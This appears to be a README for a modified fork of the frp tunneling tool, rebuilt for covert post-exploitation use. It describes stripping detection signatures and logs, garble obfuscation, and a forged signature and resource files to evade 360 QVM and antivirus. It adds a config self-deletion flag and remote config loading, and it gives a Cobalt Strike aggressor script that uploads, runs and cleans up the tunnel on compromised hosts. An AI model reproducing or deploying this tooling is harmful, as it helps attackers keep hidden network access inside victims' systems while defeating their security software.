# frp二开

本项目是基于frp 0.58.1的二开项目

VT查杀 7/73 加签名后可过QVM
![image-20240702202600383](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407022026483.png)
![image-20240702203531210](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202407022035330.png)

项目进行了如下改动
## 1. 特征修改
包括静态特征 流量特征
删除了大部分的log输出
使用garble编译混淆


## 2. 参数修改
修改默认的`-c`指定配置文件为`-o`
加入配置文件自删除参数`-s`或者`--suicide`
远程加载配置文件：frpc.exe -r http://127.0.0.1/frpc.toml


## 3. 资源文件添加
添加资源文件 用来过360QVM `2024.07.02 19:00` 测试 加上资源文件并伪造签名后可过QVM
如需修改icon 更换根目录`icon.ico` 并执行

```cmd
go install github.com/akavel/rsrc@latest
```

```cmd
rsrc -ico icon.ico -o ./cmd/frpc/icon.syso
rsrc -ico icon.ico -o ./cmd/frps/icon.syso
```

## 4. cs插件

基于[xq17](https://www.anquanke.com/member.html?memberId=130474)师傅的插件进行改写

使用方式:
  
  cs直接加载`cs_frp_plugin`文件夹中的`frp.cna`
  
  upload 上传`frpc.exe frpc.toml`
  run 执行frpc并删除配置文件
  delete 杀进程删文件

```cna
popup beacon_bottom {
    menu "Frp"{
        item "Upload" {
            $bid = $1;
            $dialog = dialog("Upload frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &upload);
            drow_text($dialog, "UploadPath",  "path: ");
            dbutton_action($dialog, "ok");
            dialog_show($dialog);
        }
        sub upload {
            # switch to specify path
            bcd($bid, $3['UploadPath']);
            bsleep($bid, 0 ,0);

            bupload($bid, script_resource("/scripts/frpc.toml"));
            bupload($bid, script_resource("/scripts/frpc.exe"));
            
            show_message("Executing cmmand!");
        }
        item "Run"{
            $bid = $1;
            $dialog = dialog("Run frpc", %(uri => "frpc.toml -s", bid => $bid), &run);
            drow_text($dialog, "uri",  "configURI: ");
            dbutton_action($dialog, "ok");
            dialog_show($dialog);
        }

        sub run{
            local('$Uri');
            $Uri =  $3['uri'];
            bshell($bid, "frpc.exe -o  $+ $Uri ");
            show_message("Executing cmmand!");
            bsleep($bid, 10, 0);
        }

        item "Delete" {
            # local("bid");
            bshell($1, "taskkill /f /t /im frpc.exe &&  del /f /s /q frpc.exe");
        }
    }
}
```


